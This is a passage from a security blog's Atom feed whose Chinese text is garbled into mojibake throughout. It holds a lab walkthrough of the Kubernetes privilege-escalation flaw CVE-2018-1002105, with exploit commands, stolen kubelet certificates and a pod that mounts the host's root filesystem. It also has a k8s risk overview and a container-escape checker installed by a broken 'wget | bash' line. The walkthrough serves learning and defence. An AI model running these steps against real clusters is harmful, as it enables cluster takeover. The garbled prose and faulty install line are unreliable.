å»ºç«‹ WebSocket è¿æ¥ã€‚</p><p>è€Œä¸”å› ä¸º getExec æŠ¥é”™å¤±è´¥äº†ï¼Œæ‰€ä»¥è¿™ç§è¿æ¥ä¹Ÿæ²¡æœ‰å¯¹æ¥åˆ°æŸä¸ª Pod ä¸Šï¼Œè¿æ¥ä¹Ÿæ²¡æœ‰è¢«é”€æ¯ï¼Œå®¢æˆ·ç«¯å¯ä»¥ç»§ç»­é€šè¿‡è¿™ä¸ªè¿æ¥å‘ Kubelet å‘é€æŒ‡ä»¤ã€‚</p><p>ç”±äºç»è¿‡äº† API Server çš„ä»£ç†ï¼Œå› æ­¤æŒ‡ä»¤æ˜¯ä»¥ API Server çš„æƒé™å‘ Kubelet ä¸‹å‘çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®¢æˆ·ç«¯èƒ½è‡ªç”±çš„å‘è¯¥ Kubelet ä¸‹å‘æŒ‡ä»¤ï¼Œè€Œä¸å—é™åˆ¶ï¼Œä»è€Œå®ç°äº†æƒé™æå‡ã€‚</p><h1 id="0x02-æ¼æ´å¤ç°"><a href="#0x02-æ¼æ´å¤ç°" class="headerlink" title="0x02 æ¼æ´å¤ç°"></a>0x02 æ¼æ´å¤ç°</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>é¦–å…ˆéœ€è¦å®‰è£…ä½ç‰ˆæœ¬çš„ k8sï¼Œè¿™é‡Œç‰ˆæœ¬ä¸º 1.11.1</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">git clone https<span class="token punctuation">:</span>//github.com/brant<span class="token punctuation">-</span>ruan/metarget.gitcd metarget/pip3 install <span class="token punctuation">-</span>r requirements.txt./metarget cnv install cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span><span class="token number">1002105</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ç€éœ€è¦å‡†å¤‡ä¸€äº›æ–‡ä»¶ï¼Œæ–‡ä»¶åœ°å€ï¼š<a href="https://github.com/Metarget/cloud-native-security-book/tree/main/code/0403-CVE-2018-1002105">https://github.com/Metarget/cloud-native-security-book/tree/main/code/0403-CVE-2018-1002105</a></p><p>ä¸‹è½½è¿™äº›æ–‡ä»¶åï¼Œåˆ›å»ºç›¸åº”èµ„æº</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_namespace.yamlkubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_role.yamlkubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_rolebinding.yamlkubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_pod.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é…ç½®ç”¨æˆ·è®¤è¯</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">cp test<span class="token punctuation">-</span>token.csv /etc/kubernetes/pki/test<span class="token punctuation">-</span>role<span class="token punctuation">-</span>token.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ API Server çš„é…ç½®æ–‡ä»¶ /etc/kubernetes/manifests/kube-apiserver.yaml ä¸­å®¹å™¨çš„å¯åŠ¨å‚æ•°éƒ¨åˆ†æœ«å°¾ï¼ˆspec.container.commandï¼‰å¢åŠ ä¸€è¡Œé…ç½®</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">-</span><span class="token punctuation">-</span>token<span class="token punctuation">-</span>auth<span class="token punctuation">-</span>file=/etc/kubernetes/pki/test<span class="token punctuation">-</span>role<span class="token punctuation">-</span>token.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç­‰å¾… API Server é‡å¯ï¼Œæ­¤æ—¶åœºæ™¯å°±æ­å»ºå®Œæ¯•äº†ï¼Œä¸‹é¢æµ‹è¯•ä¸‹ï¼Œåœºæ™¯æ˜¯å¦æ­£å¸¸</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>token=password <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>insecure<span class="token punctuation">-</span>skip<span class="token punctuation">-</span>tls<span class="token punctuation">-</span>verify exec <span class="token punctuation">-</span>it test <span class="token punctuation">-</span>n test /bin/hostnamekubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>token=password <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>insecure<span class="token punctuation">-</span>skip<span class="token punctuation">-</span>tls<span class="token punctuation">-</span>verify get pods <span class="token punctuation">-</span>n kube<span class="token punctuation">-</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç»“æœæ˜¾ç¤ºèƒ½å¤Ÿå¯¹æŒ‡å®š Pod æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ä¸èƒ½æ‰§è¡Œå…¶ä»–è¶Šæƒæ“ä½œï¼Œç¬¦åˆé¢„æœŸåœºæ™¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628124.png"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ä½¿ç”¨è„šæœ¬è·å¾—é«˜æƒé™å‡­è¯æ–‡ä»¶ï¼Œè„šæœ¬åœ°å€ï¼š<a href="https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py">https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py</a></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">python3 exploit.py <span class="token punctuation">-</span><span class="token punctuation">-</span>target 172.16.214.18 <span class="token punctuation">-</span><span class="token punctuation">-</span>port 6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>bearer<span class="token punctuation">-</span>token password <span class="token punctuation">-</span><span class="token punctuation">-</span>namespace test <span class="token punctuation">-</span><span class="token punctuation">-</span>pod test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628455.png"></p><p>æ¥ç€ï¼Œä½¿ç”¨æ‹¿åˆ°çš„é«˜æƒé™å‡­è¯åœ¨é›†ç¾¤ä¸­æ–°å»ºä¸€ä¸ªæŒ‚è½½äº†å®¿ä¸»æœºæ ¹ç›®å½•çš„ Podï¼Œyaml æ–‡ä»¶åœ°å€ï¼š<a href="https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/attacker.yaml">https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/attacker.yaml</a></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>certificate<span class="token punctuation">-</span>authority=./ca.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>certificate=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>key=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.key apply <span class="token punctuation">-</span>f attacker.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Pod è¢«æˆåŠŸåˆ›å»ºåï¼Œæ‰§è¡Œ ls /host-escape-door å‘½ä»¤å¯æˆåŠŸçœ‹åˆ°å®¿ä¸»æœºä¸‹çš„æ–‡ä»¶ã€‚</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>certificate<span class="token punctuation">-</span>authority=./ca.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>certificate=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>key=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.key exec attacker ls /host<span class="token punctuation">-</span>escape<span class="token punctuation">-</span>door<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241629440.png"></p><p>è‡³æ­¤ï¼Œå®Œæˆäº† CVE-2018-1002015 æ¼æ´çš„å¤ç°ã€‚</p><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03 æ¼æ´ä¿®å¤"></a>0x03 æ¼æ´ä¿®å¤</h1><p>è¯¥æ¼æ´çš„ä¿®å¤ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œç›´æ¥åœ¨ API Server ä¸­å¢åŠ å¯¹åç«¯æœåŠ¡å™¨è¿”å›å€¼çš„åˆ¤æ–­å³å¯ã€‚</p><p>åœ¨æ–°ç‰ˆ k8s ä¸­çš„ tryUpgrade å‡½æ•°è¿™é‡Œï¼Œä¼šåˆ¤æ–­çŠ¶æ€ç æ˜¯å¦ç­‰äº http.StatusSwitchingProtocolsï¼Œå³ 101ï¼Œå¦‚æœçŠ¶æ€ç ä¸ç­‰äº 101ï¼Œåˆ™å…³é—­è¿æ¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241629620.png"></p><blockquote><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p>ã€Šäº‘åŸç”Ÿå®‰å…¨-æ”»é˜²å®è·µä¸ä½“ç³»æ„å»ºã€‹</p><p><a href="https://xz.aliyun.com/t/3542">https://xz.aliyun.com/t/3542</a></p><p><a href="https://zh.wikipedia.org/wiki/WebSocket">https://zh.wikipedia.org/wiki/WebSocket</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ä»¥ä¸‹å†…å®¹ä¸ºè‡ªå·±ä¸ªäººçš„å­¦ä¹ ç¬”è®°ï¼Œå› æ­¤å†…å®¹ä¸ä¼šå¤šä¹ˆè¯¦å®ï¼›å…¶ä¸­æœ‰äº›å†…å®¹ä¹Ÿè®¸ä¼šå­˜åœ¨é”™è¯¯ï¼Œå¦‚æœ‰é”™è¯¯æ¬¢è¿ç•™è¨€å¤„æŒ‡å‡ºï¼Œè¿˜æœ›è°…è§£ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="äº‘å®‰å…¨" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="äº‘å®‰å…¨" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="äº‘åŸç”Ÿ" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="ç¬”è®°" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="k8s" scheme="https://www.teamssix.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>ã€äº‘å®‰å…¨ã€‘k8s æ‰€é¢ä¸´çš„é£é™©å­¦ä¹ </title>
    <link href="https://www.teamssix.com/220321-185825.html"/>
    <id>https://www.teamssix.com/220321-185825.html</id>
    <published>2022-03-21T10:58:25.000Z</published>
    <updated>2022-03-21T11:11:51.911Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> ä»¥ä¸‹å†…å®¹ä¸ºè‡ªå·±ä¸ªäººçš„å­¦ä¹ ç¬”è®°ï¼Œå› æ­¤å†…å®¹ä¸ä¼šå¤šä¹ˆè¯¦å®ï¼›å…¶ä¸­æœ‰äº›å†…å®¹ä¹Ÿè®¸ä¼šå­˜åœ¨é”™è¯¯ï¼Œå¦‚æœ‰é”™è¯¯æ¬¢è¿ç•™è¨€å¤„æŒ‡å‡ºï¼Œè¿˜æœ›è°…è§£ã€‚</p></blockquote><h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>Kubernetes åˆç§° k8sï¼Œæ˜¯ Google åœ¨ 2014 å¹´å¼€æºçš„ä¸€ä¸ªç”¨æ¥ç®¡ç†å®¹å™¨çš„å¹³å°ï¼Œä»¥ä¸‹æ˜¯ k8s æ¶æ„å›¾ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203211854408.png"></p><p>k8s ä¸»è¦ç”±ä»¥ä¸‹æ ¸å¿ƒç»„ä»¶ç»„æˆï¼š</p><ul><li>etcd ä¿å­˜äº†æ•´ä¸ªé›†ç¾¤çš„çŠ¶æ€</li><li>API Server æä¾›äº†èµ„æºæ“ä½œçš„å”¯ä¸€å…¥å£ï¼Œå¹¶æä¾›è®¤è¯ã€æˆæƒã€è®¿é—®æ§åˆ¶ã€API æ³¨å†Œå’Œå‘ç°ç­‰æœºåˆ¶</li><li>Controller Manager è´Ÿè´£ç»´æŠ¤é›†ç¾¤çš„çŠ¶æ€ï¼Œæ¯”å¦‚æ•…éšœæ£€æµ‹ã€è‡ªåŠ¨æ‰©å±•ã€æ»šåŠ¨æ›´æ–°ç­‰</li><li>Scheduler è´Ÿè´£èµ„æºçš„è°ƒåº¦ï¼ŒæŒ‰ç…§é¢„å®šçš„è°ƒåº¦ç­–ç•¥å°† Pod è°ƒåº¦åˆ°ç›¸åº”çš„æœºå™¨ä¸Š</li><li>Kubelet è´Ÿè´£ç»´æŠ¤å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒæ—¶ä¹Ÿè´Ÿè´£Volumeï¼ˆCVIï¼‰å’Œç½‘ç»œï¼ˆCNIï¼‰çš„ç®¡ç†</li><li>Container Runtime è´Ÿè´£é•œåƒç®¡ç†ä»¥åŠ Pod å’Œå®¹å™¨çš„çœŸæ­£è¿è¡Œï¼ˆCRIï¼‰</li><li>Kube-proxy è´Ÿè´£ä¸º Service æä¾› Cluster å†…éƒ¨çš„æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡</li></ul><p>è¿™é‡Œå­¦ä¹ ä¸‹ k8s ä¸­æ‰€é¢ä¸´çš„ä¸€äº›é£é™©ï¼Œä¸»è¦æœ‰ 5 ä¸ªéƒ¨åˆ†ï¼š</p><p>1ã€å®¹å™¨åŸºç¡€è®¾æ–½å­˜åœ¨çš„é£é™©</p><p>2ã€ç»„ä»¶æ¥å£å­˜åœ¨çš„é£é™©</p><p>3ã€é›†ç¾¤ç½‘ç»œå­˜åœ¨çš„é£é™©</p><p>4ã€è®¿é—®æ§åˆ¶æœºåˆ¶å­˜åœ¨çš„é£é™©</p><p>5ã€è‡ªèº«çš„æ¼æ´</p><p>å…¶ä¸­å®¹å™¨åŸºç¡€è®¾æ–½å­˜åœ¨çš„é£é™©å’Œä¹‹å‰åˆ†äº«çš„åŸºæœ¬ä¸€è‡´ï¼Œè¿™é‡Œä¸»è¦çœ‹å‰©ä¸‹çš„å››ç§ã€‚</p><h1 id="0x01-ç»„ä»¶æ¥å£å­˜åœ¨çš„é£é™©"><a href="#0x01-ç»„ä»¶æ¥å£å­˜åœ¨çš„é£é™©" class="headerlink" title="0x01 ç»„ä»¶æ¥å£å­˜åœ¨çš„é£é™©"></a>0x01 ç»„ä»¶æ¥å£å­˜åœ¨çš„é£é™©</h1><h2 id="1ã€API-Server"><a href="#1ã€API-Server" class="headerlink" title="1ã€API Server"></a>1ã€API Server</h2><p>API Server é»˜è®¤æœåŠ¡ç«¯å£ä¸º 8080 å’Œ 6443ï¼Œ8080 ç«¯å£æä¾› HTTP æœåŠ¡ï¼Œæ²¡æœ‰è®¤è¯ä¸æˆæƒæœºåˆ¶ï¼Œè€Œ 6443 æä¾› HTTP æœåŠ¡ï¼Œæ”¯æŒè®¤è¯å’ŒæˆæƒæœåŠ¡ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ 8080 ç«¯å£ä¸å¯åŠ¨ï¼Œä½†å¦‚æœç”¨æˆ·å¼€å¯äº†è¯¥æœåŠ¡ï¼Œå°±ä¼šé€ æˆ API Server çš„æœªæˆæƒè®¿é—®ï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªé›†ç¾¤ã€‚</p><h2 id="2ã€Kubelet"><a href="#2ã€Kubelet" class="headerlink" title="2ã€Kubelet"></a>2ã€Kubelet</h2><p>ä¸ API Server ç±»ä¼¼ï¼ŒKubelet ä¹Ÿè¿è¡Œç€ API æœåŠ¡ï¼Œé»˜è®¤æœåŠ¡ç«¯å£ä¸º 10250 å’Œ 10248</p><p>Kubelet å­˜åœ¨çš„é£é™©ä¸»è¦ä¹Ÿæ˜¯æœªæˆæƒè®¿é—®ï¼Œå¦‚æœ Kubelet å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œå°±å¯ä»¥æ§åˆ¶æ‰€åœ¨èŠ‚ç‚¹çš„æƒé™ã€‚</p><h2 id="3ã€Dashboard"><a href="#3ã€Dashboard" class="headerlink" title="3ã€Dashboard"></a>3ã€Dashboard</h2><p>Dashboard é»˜è®¤ç«¯å£ä¸º  8001ï¼Œä» 1.10.1 ç‰ˆæœ¬èµ·ï¼ŒDashboard é»˜è®¤ç¦ç”¨äº†è·³è¿‡æŒ‰é’®ï¼Œä½†å¦‚æœç”¨æˆ·ä¸ºäº†æ–¹ä¾¿æˆ–è€…å…¶ä»–åŸå› ï¼Œå¼€å¯äº†ç›¸å…³åŠŸèƒ½ï¼Œå°±ä¼šå¯¼è‡´ Dashboard çš„æœªæˆæƒè®¿é—®ã€‚</p><h2 id="4ã€etcd"><a href="#4ã€etcd" class="headerlink" title="4ã€etcd"></a>4ã€etcd</h2><p>etcd é»˜è®¤ç›‘å¬ 2379ã€2380 ç«¯å£ï¼Œå‰è€…ç”¨äºå®¢æˆ·ç«¯è¿æ¥ï¼Œåè€…ç”¨äºå¤šä¸ª etcd å®ä¾‹ä¹‹é—´çš„é€šä¿¡ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œetcd æä¾›çš„ä¸¤ä¸ªç«¯å£éƒ½éœ€è¦ç›¸åº”çš„è¯ä¹¦æ‰èƒ½è®¿é—®ï¼Œä½†å¦‚æœ RT çªƒå–äº†è¯ä¹¦ï¼Œæˆ–è€…ç”¨æˆ·å°† etcd è®¾ç½®äº†å…è®¸åŒ¿åé—®ï¼Œé‚£ä¹ˆ RT å°±å¯ä»¥ç›´æ¥è®¿é—® etcd å¹¶çªƒå–æ•°æ®ã€‚</p><p>ç”±äº Kubernetes é›†ç¾¤å†…éƒ¨çš„å„ç§èµ„æºåŠå…¶çŠ¶æ€éƒ½å­˜åœ¨ etcd ä¸­ï¼Œå› æ­¤å¦‚æœå¯ä»¥è¯»å– etcd çš„æ•°æ®ï¼Œå°±å¯èƒ½è·å¾—é«˜æƒé™ï¼Œä»è€Œæ§åˆ¶é›†ç¾¤ã€‚</p><h1 id="0x03-é›†ç¾¤ç½‘ç»œå­˜åœ¨çš„é£é™©"><a href="#0x03-é›†ç¾¤ç½‘ç»œå­˜åœ¨çš„é£é™©" class="headerlink" title="0x03 é›†ç¾¤ç½‘ç»œå­˜åœ¨çš„é£é™©"></a>0x03 é›†ç¾¤ç½‘ç»œå­˜åœ¨çš„é£é™©</h1><p>Pod æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨æ„æˆçš„é›†åˆï¼Œåœ¨æ²¡æœ‰å…¶ä»–ç½‘ç»œéš”ç¦»ç­–ç•¥å’Œ Pod å®‰å…¨ç­–ç•¥çš„é»˜è®¤æƒ…å†µä¸‹ï¼Œç”±äº Pod ä¸ Pod ä¹‹é—´å¯ä»¥è”é€šï¼Œä¸” Pod å†…çš„ root ç”¨æˆ·å…·æœ‰ CAP_NET_RAW æƒé™ï¼ˆå³å…è®¸ä½¿ç”¨åŸå§‹å¥—æ¥å­—çš„æƒé™ï¼‰ï¼Œå› æ­¤é›†ç¾¤å†…éƒ¨å¯èƒ½ä¼šå‘ç”Ÿå†…ç½‘æ¨ªå‘çš„é£é™©ã€‚</p><h1 id="0x04-è®¿é—®æ§åˆ¶æœºåˆ¶å­˜åœ¨çš„é£é™©"><a href="#0x04-è®¿é—®æ§åˆ¶æœºåˆ¶å­˜åœ¨çš„é£é™©" class="headerlink" title="0x04 è®¿é—®æ§åˆ¶æœºåˆ¶å­˜åœ¨çš„é£é™©"></a>0x04 è®¿é—®æ§åˆ¶æœºåˆ¶å­˜åœ¨çš„é£é™©</h1><p>Kubernetes ä¸­çš„è®¿é—®æ§åˆ¶æœºåˆ¶ä¸»è¦ç”±è®¤è¯æœºåˆ¶ã€æˆæƒæœºåˆ¶å’Œå‡†å…¥æœºåˆ¶ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆã€‚</p><p>å¦‚æœè®¿é—®æ§åˆ¶æ¯”è¾ƒå®½æ¾æˆ–æ··ä¹±æˆ–è€…å…è®¸ Kubernetes çš„æœªæˆæƒè®¿é—®ï¼ŒRT å¯èƒ½å€Ÿæ­¤ç›´æ¥è·å¾—é›†ç¾¤ç®¡ç†å‘˜æƒé™ã€‚</p><h1 id="0x05-æ— æ³•æ ¹æ²»çš„è½¯ä»¶æ¼æ´"><a href="#0x05-æ— æ³•æ ¹æ²»çš„è½¯ä»¶æ¼æ´" class="headerlink" title="0x05 æ— æ³•æ ¹æ²»çš„è½¯ä»¶æ¼æ´"></a>0x05 æ— æ³•æ ¹æ²»çš„è½¯ä»¶æ¼æ´</h1><p>Kubernetes è‡ªèº«ä¹Ÿè¢«çˆ†å‡ºè®¸å¤šå®‰å…¨æ¼æ´ï¼Œè¿™ç±»è‡ªç„¶ä¹Ÿå±äº Kubernetes æ‰€é¢ä¸´çš„çš„é£é™©ã€‚</p><blockquote><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p>ã€Šäº‘åŸç”Ÿå®‰å…¨-æ”»é˜²å®è·µä¸ä½“ç³»æ„å»ºã€‹</p><p><a href="https://www.jianshu.com/p/a7f6c4f420fa">https://www.jianshu.com/p/a7f6c4f420fa</a></p><p><a href="https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/">https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/</a></p><p><a href="https://www.kubernetes.org.cn/kubernetes%E8%AE%BE%E8%AE%A1%E6%9E%B6%E6%9E%84">https://www.kubernetes.org.cn/kubernetes%E8%AE%BE%E8%AE%A1%E6%9E%B6%E6%9E%84</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt; ä»¥ä¸‹å†…å®¹ä¸ºè‡ªå·±ä¸ªäººçš„å­¦ä¹ ç¬”è®°ï¼Œå› æ­¤å†…å®¹ä¸ä¼šå¤šä¹ˆè¯¦å®ï¼›å…¶ä¸­æœ‰äº›å†…å®¹ä¹Ÿè®¸ä¼šå­˜åœ¨é”™è¯¯ï¼Œå¦‚æœ‰é”™è¯¯æ¬¢è¿ç•™è¨€å¤„æŒ‡å‡ºï¼Œè¿˜æœ›è°…è§£ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;head</summary>
      
    
    
    
    <category term="äº‘å®‰å…¨" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="äº‘å®‰å…¨" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="äº‘åŸç”Ÿ" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="ç¬”è®°" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="k8s" scheme="https://www.teamssix.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>ã€å·¥å…·åˆ†äº«ã€‘ä¸€ä¸ªæ£€æµ‹å®¹å™¨é€ƒé€¸çš„è„šæœ¬</title>
    <link href="https://www.teamssix.com/220318-164446.html"/>
    <id>https://www.teamssix.com/220318-164446.html</id>
    <published>2022-03-18T08:44:46.000Z</published>
    <updated>2022-03-18T09:03:35.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>æœ€è¿‘æäº†ä¸ªæ£€æµ‹ Docker å®¹å™¨é€ƒé€¸çš„è„šæœ¬ï¼Œç›®å‰æ”¯æŒä»¥ä¸‹å‡ ç§æ–¹æ³•çš„æ£€æµ‹ï¼š</p><ol><li>å¤„äºç‰¹æƒæ¨¡å¼</li><li>æŒ‚è½½äº† Docker Socket</li><li>æŒ‚è½½äº† Procfs</li><li>æŒ‚è½½äº†å®¿ä¸»æœºæ ¹ç›®å½•</li><li>å¼€å¯äº† Docker è¿œç¨‹ API è®¿é—®æ¥å£</li><li>CVE-2016-5195 DirtyCow è„ç‰›æ¼æ´</li><li>CVE-2020-14386 </li><li>CVE-2022-0847 DirtyPipe</li></ol><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/teamssix/container-escape-check">https://github.com/teamssix/container-escape-check</a></p><p>æ„Ÿè§‰è¿˜ä¸é”™çš„å¸ˆå‚…ä»¬å¯ä»¥ç‚¹ä¸ªå°æ˜Ÿæ˜Ÿ ğŸŒŸ</p><p>å¯¹äºæ£€æµ‹çš„åŸç†å¯ä»¥çœ‹æˆ‘å†™çš„è¿™ç¯‡æ–‡ç« ï¼š<a href="https://zone.huoxian.cn/d/990">https://zone.huoxian.cn/d/990</a></p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>åœ¨ Docker å®¹å™¨ä¸­ä¸€é”®è¿è¡Œï¼š</p><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;teamssix&#x2F;container-escape-check&#x2F;main&#x2F;container-escape-check.sh | bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…å…‹éš†é¡¹ç›®åˆ°å®¹å™¨ä¸­è¿è¡Œï¼š</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;teamssix&#x2F;container-escape-check.gitcd container-escape-checkchmod +x container-escape-check.sh.&#x2F;container-escape-check.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203181518954.png"></p><h1 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h1><ul><li>è¿™ä¸ªè„šæœ¬éœ€è¦åœ¨ Docker å®¹å™¨ä¸­è¿è¡Œ</li><li>è¿™é‡Œçš„æ£€æµ‹æ–¹æ³•å¤§å¤šæ˜¯åŸºäºæˆ‘è‡ªå·±çš„ç»éªŒï¼Œå¯èƒ½ä¼šå­˜åœ¨æ£€æµ‹è¯¯æ£€æˆ–è€…æ¼æ£€çš„æƒ…å†µï¼Œå¦‚æœæ‚¨å‘ç°äº†è¿™ç§æƒ…å†µï¼Œæ¬¢è¿æ Issue</li><li>ç”±äºæœ‰çš„é€ƒé€¸æ–¹æ³•éœ€è¦æ ¹æ®ç›®æ ‡ Docker çš„ç‰ˆæœ¬å»åˆ¤æ–­ï¼Œè¿™é‡Œæˆ‘æš‚æ—¶è¿˜æ²¡æƒ³åˆ°ä»å®¹å™¨å†…éƒ¨è·å– Docker ç‰ˆæœ¬çš„æ–¹æ³•ï¼Œå› 